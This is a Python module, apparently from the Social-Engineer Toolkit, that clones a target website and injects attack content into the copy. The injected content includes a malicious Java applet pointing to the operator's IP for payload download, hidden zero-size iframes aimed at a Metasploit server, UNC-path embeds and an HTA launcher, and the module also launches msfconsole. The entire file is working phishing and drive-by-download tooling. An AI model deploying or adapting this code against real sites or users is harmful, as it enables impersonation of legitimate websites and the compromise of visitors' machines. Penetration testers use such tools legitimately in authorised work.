from src.core.setcore import *
import subprocess
import os
import sys
import time
import re
import shutil
import urllib
try: import urllib.request
except ImportError: 
    import urllib2
    pass
operating_system = check_os()
definepath = os.getcwd()
sys.path.append("/etc/setoolkit")
from set_config import USER_AGENT_STRING as user_agent
from set_config import WEB_PORT as web_port
from set_config import JAVA_ID_PARAM as java_id
from set_config import JAVA_REPEATER as java_repeater  # Boolean
from set_config import JAVA_TIME as java_time
from set_config import METASPLOIT_IFRAME_PORT as metasploit_iframe
from set_config import AUTO_REDIRECT as auto_redirect  # Boolean
from set_config import UNC_EMBED as unc_embed  # Boolean
sys.path.append(definepath)
track_email = check_config("TRACK_EMAIL_ADDRESSES=").lower()
if check_options("IPADDR=") != 0:
    ipaddr = check_options("IPADDR=")
else:
    ipaddr = input("Enter your IP address: ")
    update_options("IPADDR=" + ipaddr)
site_cloned = True
meterpreter_iframe = "8080"
if not os.path.isdir(userconfigpath + "web_clone/"):
    os.makedirs(userconfigpath + "web_clone")
if os.path.isfile(userconfigpath + "proxy.confg"):
    fileopen = open(userconfigpath + "proxy.config", "r")
    proxy_config = fileopen.read().rstrip()
if not os.path.isfile(userconfigpath + "proxy.confg"):
    proxy_config = "ls"
webdav_meta = 0
try:
    fileopen = open(userconfigpath + "meta_config", "r")
    for line in fileopen:
        line = line.rstrip()
        match = re.search("set SRVPORT 80", line)
        if match:
            match2 = re.search("set SRVPORT %s" % (metasploit_iframe), line)
            if not match2:
                webdav_meta = 80
except:
    pass
template = ""
fileopen = open(userconfigpath + "site.template", "r").readlines()
for line in fileopen:
    line = line.rstrip()
    match = re.search("TEMPLATE=", line)
    if match:
        line = line.split("=")
        template = line[1]
attack_vector = ""
if os.path.isfile(userconfigpath + "attack_vector"):
    fileopen = open(userconfigpath + "attack_vector", "r").readlines()
    for line in fileopen:
        attack_vector = line.rstrip()
rand_gen_win = generate_random_string(6, 15)
rand_gen_mac = generate_random_string(6, 15)
rand_gen_nix = generate_random_string(6, 15)
rand_gen_applet = generate_random_string(6, 15) + ".jar"
update_options("APPLET_NAME=" + rand_gen_applet)
try:
    fileopen = open(userconfigpath + "site.template", "r").readlines()
    url_counter = 0
    for line in fileopen:
        line = line.rstrip()
        match = re.search("URL=", line)
        if match:
            line = line.replace("URL=", "")
            url = line.rstrip()
    if url != "NULL":
        if template != "SET":
            print((bcolors.YELLOW + "\n[*] Cloning the website: " + (url)))
            print(("[*] This could take a little bit..." + bcolors.ENDC))
    if template != "SELF":
        counter = 0
        try:
            DNULL = open(os.devnull, 'w')
            wget = subprocess.call(
                'wget', shell=True, stdout=DNULL, stderr=subprocess.STDOUT)
            if wget == 1:
                if check_config("WGET_DEEP").lower() == "on":
                    subprocess.Popen('%s;wget -H -N -k -p -l 2 -nd -P %s/web_clone/ --no-check-certificate -U "%s" "%s";' %
                                     (proxy_config, userconfigpath, user_agent, url), shell=True).wait()
                else:
                    subprocess.Popen('%s;cd %s/web_clone/;wget --no-check-certificate -O index.html -c -k -U "%s" "%s";' %
                                     (proxy_config, userconfigpath, user_agent, url), stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=True).wait()
            else:
                headers = {'User-Agent': user_agent}
                try:
                    req = urllib.request.Request(url, None, headers)
                    html = urllib.request.urlopen(req).read()
                except AttributeError:
                    req = urllib2.Request(url, headers=headers)
                    html = urllib2.urlopen(req).read()
                if len(html) > 1:
                    site_cloned = True
                    filewrite = open(userconfigpath + "web_clone/index.html", "w")
                    filewrite.write(html.decode("utf-8"))
                    filewrite.close()
        except Exception as err:
            print(err)
            pass
        if not os.path.isfile(userconfigpath + "web_clone/index.html"):
            print((
                bcolors.RED + "[*] Error. Unable to clone this specific site. Check your internet connection.\n" + bcolors.ENDC))
            return_continue()
            site_cloned = False
            filewrite = open(userconfigpath + "cloner.failed", "w")
            filewrite.write("failed")
            filewrite.close()
        if os.path.isfile(userconfigpath + "web_clone/index.html"):
            fileopen = open(userconfigpath + "web_clone/index.html", "r", encoding='utf-8', errors='ignore')
            counter = 0
            for line in fileopen:
                counter = counter + 1
            if counter == 1 or counter == 0:
                print((
                    bcolors.RED + "[*] Error. Unable to clone this specific site. Check your internet connection.\n" + bcolors.ENDC))
                return_continue()
                site_cloned = False
                os.remove(userconfigpath + "web_clone/index.html")
                filewrite = open(userconfigpath + "cloner.failed", "w")
                filewrite.write("failed")
                filewrite.close()
        if site_cloned == True:
            shutil.copyfile(userconfigpath + "web_clone/index.html",
                            userconfigpath + "web_clone/index.html.bak")
    if site_cloned == True:
        if unc_embed == True:
            fileopen = open(userconfigpath + "web_clone/index.html", "r")
            index_database = fileopen.read()
            filewrite = open(userconfigpath + "web_clone/index.html", "w")
            fileopen4 = open("src/webattack/web_clone/unc.database", "r")
            unc_database = fileopen4.read()
            unc_database = unc_database.replace("IPREPLACEHERE", ipaddr)
            unc_database = unc_database.replace("RANDOMNAME", rand_gen_win)
            match = re.search("</body.*?>", index_database)
            if match:
                index_database = re.sub(
                    "</body.*?>", unc_database + "\n</body>", index_database)
            if not match:
                index_database = re.sub(
                    "<head.*?>", "\n<head>" + unc_database, index_database)
            filewrite.write(index_database)
            filewrite.close()
        multi_java = False
        if os.path.isfile(userconfigpath + "multi_java"):
            multi_java = True
        if attack_vector == "java" or multi_java:
            print((
                bcolors.RED + "[*] Injecting Java Applet attack into the newly cloned website." + bcolors.ENDC))
            time.sleep(2)
            if not os.path.isfile(userconfigpath + "web_clone/index.html"):
                print_error(
                    "Unable to clone the website it appears. Email us to fix.")
                sys.exit()
            fileopen = open(userconfigpath + "web_clone/index.html", "r")
            fileopen2 = open("src/webattack/web_clone/applet.database", "r")
            filewrite = open(userconfigpath + "web_clone/index.html.new", "w")
            fileopen3 = open("src/webattack/web_clone/repeater.database", "r")
            index_database = fileopen.read()
            applet_database = fileopen2.read()
            repeater_database = fileopen3.read()
            applet_database = applet_database.replace("msf.exe", rand_gen_win)
            applet_database = applet_database.replace("mac.bin", rand_gen_mac)
            applet_database = applet_database.replace("nix.bin", rand_gen_nix)
            applet_database = applet_database.replace(
                "RANDOMIZE1", rand_gen_applet)
            update_options("MSF.EXE=%s\nMAC.BIN=%s\nNIX.BIN=%s" %
                           (rand_gen_win, rand_gen_mac, rand_gen_nix))
            applet_database = applet_database.replace(
                "ipaddrhere", ipaddr + ":" + str(web_port))
            applet_database = applet_database.replace(
                "IDREPLACEHERE", java_id, 2)
            if unc_embed == True:
                unc_database = unc_database.replace("IPREPLACEHERE", ipaddr)
                unc_database = unc_database.replace("RANDOMNAME", rand_gen_win)
            if java_repeater == True:
                repeater_database = repeater_database.replace(
                    "IDREPLACEHERE", java_id, 2)
                repeater_database = repeater_database.replace(
                    "TIMEHEREPLZ", java_time)
                repeater_database = repeater_database.replace(
                    "URLHEREPLZ", url)
                repeater_database = repeater_database.replace(
                    "RANDOMFUNCTION", generate_random_string(5, 15), 3)
            index_database = re.sub("</BODY.*?>", "</body>", index_database)
            index_database = re.sub("<HEAD.*?>", "<head>", index_database)
            index_database = re.sub("<BODY.*?>", "<body>", index_database)
            if java_repeater == True:
                match = re.search("</body.*?>", index_database)
                if match:
                    index_database = re.sub(
                        "<applet ", repeater_database + "\n<applet ", index_database)
                if not match:
                    index_database = re.sub(
                        "<head.*?>", "\n<head>" + repeater_database, index_database)
            counter = 0
            match = re.search("</body.*?>", index_database)
            if match:
                counter = 1
                index_database = re.sub(
                    "</body.*?>", applet_database + "\n</body>", index_database)
                if auto_redirect == True:
                    index_database = index_database.replace(
                        '<param name="9" value=""', '<param name="9" value="%s"' % (url))
            if not match:
                match = re.search("<head.*?>", index_database)
                if match:
                    counter = 1
                    index_database = re.sub(
                        "<head.*?>", "\n<head>" + applet_database, index_database)
                    if auto_redirect == True:
                        index_database = index_database.replace(
                            '<param name="9" value=""', '<param name="9" value="%s"' % (url))
            if java_repeater == True:
                match = re.search("</body.*?>", index_database)
                if match:
                    index_database = re.sub(
                        "<applet", repeater_database + "\n<applet ", index_database)
                if not match:
                    index_database = re.sub(
                        "<head.*?>", "\n<head>" + repeater_database, index_database)
                if counter == 0:
                    print_error("Unable to clone the website...Sorry.")
                    print_error(
                        "This is usally caused by a missing body tag on a website.")
                    print_error("Try a diferent site and attempt it again.")
                    sys.exit(1)
            filewrite.write(index_database)
            filewrite.close()
            print((bcolors.BLUE + "[*] Filename obfuscation complete. Payload name is: " + rand_gen_win + "\n[*] Malicious java applet website prepped for deployment\n" + bcolors.ENDC))
        if check_options("ATTACK_VECTOR") == "HTA":
            if os.path.isfile(userconfigpath + "Launcher.hta"):
                data1 = open(userconfigpath + "web_clone/index.html", "r").read()
                data2 = open(userconfigpath + "hta_index", "r").read()
                data3 = data1.replace("</body>", data2 + "</body>")
                filewrite = open(userconfigpath + "web_clone/index.html", "w")
                filewrite.write(data3)
                filewrite.close()
                print_status("Copying over files to Apache server...")
                apache_dir = check_config("APACHE_DIRECTORY=")
                if os.path.isdir(apache_dir + "/html"):
                    apache_dir = apache_dir + "/html"
                shutil.copyfile(userconfigpath + "web_clone/index.html",
                                apache_dir + "/index.html")
                shutil.copyfile(userconfigpath + "Launcher.hta",
                                apache_dir + "/Launcher.hta")
                print_status("Launching Metapsloit.. Please wait one.")
                subprocess.Popen("%smsfconsole -r %s/meta_config" %
                                 (meta_path(), userconfigpath), shell=True).wait()
        multi_meta = "off"
        if os.path.isfile(userconfigpath + "multi_meta"):
            multi_meta = "on"
        if attack_vector == "browser" or multi_meta == "on":
            print((
                bcolors.RED + "[*] Injecting iframes into cloned website for MSF Attack...." + bcolors.ENDC))
            if attack_vector == "multiattack":
                if os.path.isfile(userconfigpath + "web_clone/index.html"):
                    os.remove(userconfigpath + "web_clone/index.html")
                if not os.path.isfile(userconfigpath + "web_clone/index.html.new"):
                    if os.path.isfile(userconfigpath + "web_clone/index.html.bak"):
                        shutil.copyfile(
                            userconfigpath + "web_clone/index.html.bak", userconfigpath + "web_clone/index.html.new")
                if os.path.isfile(userconfigpath + "web_clone/index.html.new"):
                    shutil.copyfile(
                        userconfigpath + "web_clone/index.html.new", userconfigpath + "web_clone/index.html")
                time.sleep(1)
            fileopen = open(userconfigpath + "web_clone/index.html", "r").readlines()
            filewrite = open(userconfigpath + "web_clone/index.html.new", "w")
            counter = 0
            for line in fileopen:
                counter = 0
                if attack_vector == "browser":
                    match = re.search(rand_gen_applet, line)
                    if match:
                        line = line.replace(rand_gen_applet, "invalid.jar")
                        filewrite.write(line)
                        counter = 1
                match = re.search("<head.*?>", line, flags=re.IGNORECASE)
                if match:
                    header = match.group(0)
                match2 = re.search("<head.*?>", line, flags=re.IGNORECASE)
                if match2:
                    header = match.group(0)
                    if webdav_meta != 80:
                        line = line.replace(
                            header, header + '<iframe src ="http://%s:%s/" width="0" height="0" scrolling="no"></iframe>' % (ipaddr, metasploit_iframe))
                        filewrite.write(line)
                        counter = 1
                    if webdav_meta == 80:
                        line = line.replace(
                            header, header + '<head><meta HTTP-EQUIV="REFRESH" content="4; url=http://%s">' % (ipaddr))
                if counter == 0:
                    filewrite.write(line)
            try:
                filewrite.close()
            except:
                pass
            print((
                bcolors.BLUE + "[*] Malicious iframe injection successful...crafting payload.\n" + bcolors.ENDC))
        if attack_vector == "java" or attack_vector == "browser" or attack_vector == "multiattack":
            if not os.path.isfile(userconfigpath + "web_clone/%s" % (rand_gen_applet)):
                shutil.copyfile("src/html/Signed_Update.jar.orig",
                                userconfigpath + "web_clone/%s" % (rand_gen_applet))
            if os.path.isfile(userconfigpath + "web_clone/index.html.new"):
                shutil.move(userconfigpath + "web_clone/index.html.new",
                            userconfigpath + "web_clone/index.html")
except KeyboardInterrupt:
    print ("Control-C detected, exiting gracefully...\n")
    exit_set()